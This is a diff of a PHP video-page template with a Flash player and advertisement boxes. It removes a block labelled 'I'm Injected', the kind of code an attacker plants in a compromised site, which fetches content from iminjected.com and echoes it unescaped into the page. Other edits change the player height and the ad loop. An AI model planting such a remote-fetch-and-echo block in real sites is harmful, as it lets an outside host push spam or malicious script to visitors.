@@ -1,13 +1,3 @@
-<!-- Start I'm Injected -->
-<?php 
-	$cparams = array('http' => array('method' => 'GET','ignore_errors' => true));
-	$context = stream_context_create($cparams);
-	$fp = fopen("http://iminjected.com/?op=auto&file=confor_confortv.php&at=".$_SERVER["HTTP_USER_AGENT"], "rb", false, $context);
-	$INJECTIONS = "";
-	if ($fp) $INJECTIONS = stream_get_contents($fp);
-?>
-<!-- End I'm Injected -->
-
 <script type="text/javascript" src="<?php echo base_url()?>resources/js/swfobject.js"></script>
 <script type="text/javascript" src="<?php echo base_url()?>resources/js/fixMouseWheel.min.js"></script>
 
@@ -52,7 +42,7 @@
     }
 ?>
 <script type="text/javascript">
-    swfobject.embedSWF("<?php echo base_url().$playlistPlayer?>", "showItem", "620", "349", "9.0.0","",{
+    swfobject.embedSWF("<?php echo base_url().$playlistPlayer?>", "showItem", "620", "380", "9.0.0","",{
         // flash vars
         "player.xml":"<?php echo site_url('home/xmlvid/'.$vid_id)?>.xml"
     },{
@@ -60,8 +50,7 @@
         bgcolor:"#ffffff",
         allowfullscreen:"true"
     });
-</script>
-
+</script>          
 <body>
     <div class="content_item" >
         <?php if($video_path){?>
@@ -94,28 +83,23 @@
     <!-- /.content_item -->
 
     <?php 
-        $advs = get_random_top_adv($category,4);
+        $advs = get_random_top_adv();
         //print_r($ar);
         $attr = array('width'=>'89', 'height'=>'75', 'class'=>'icon');
     ?>
     <div class="x3_2">            
-        <?php for($i=0; $i<count($advs); $i++):?>
+        <?php for($i=1; $i<=count($advs); $i++):?>
 
             <div class="x3<?php if(($i+1)%2==0) echo ' no_margin_r';?>" style="border-color:#FFF; border:thick;">
                 <a alt="<?php echo $advs[$i]['TextTips']?>" title="<?php echo $advs[$i]['TextTips']?>" href="<?php echo site_url('advertisement/go_to/'.$advs[$i]['ID'])?>" target="<?php 
                         if($advs[$i]['Target'] ==1)  echo '_blank';
-                        else echo '_parent'?>"><img src="<?php echo base_url().'assets/uploads/image/'.$advs[$i]['ImageLink']?>" width="285" height="285" class="icon" alt="<?php echo $advs[$i]['TextTips']?>"></a>
+                        else echo '_parent'?>">
+                        <img src="<?php echo base_url().'assets/uploads/image/'.$advs[$i]['ImageLink']?>" width="285" height="285" class="icon" alt="<?php echo $advs[$i]['TextTips']?>"></a>
 
-                <br /> <br /> <br />
+                <br /><br />
 
             </div>
             <!-- /.content .top_box_block -->
             <?php endfor;?>
-    </div>
-	<div>
-		<!-- Start I'm Injected -->
-		<?php echo $INJECTIONS; ?>
-		<!-- End I'm Injected -->
-	</div>
-	
-</body>           
+    </div>   
+        </body>           
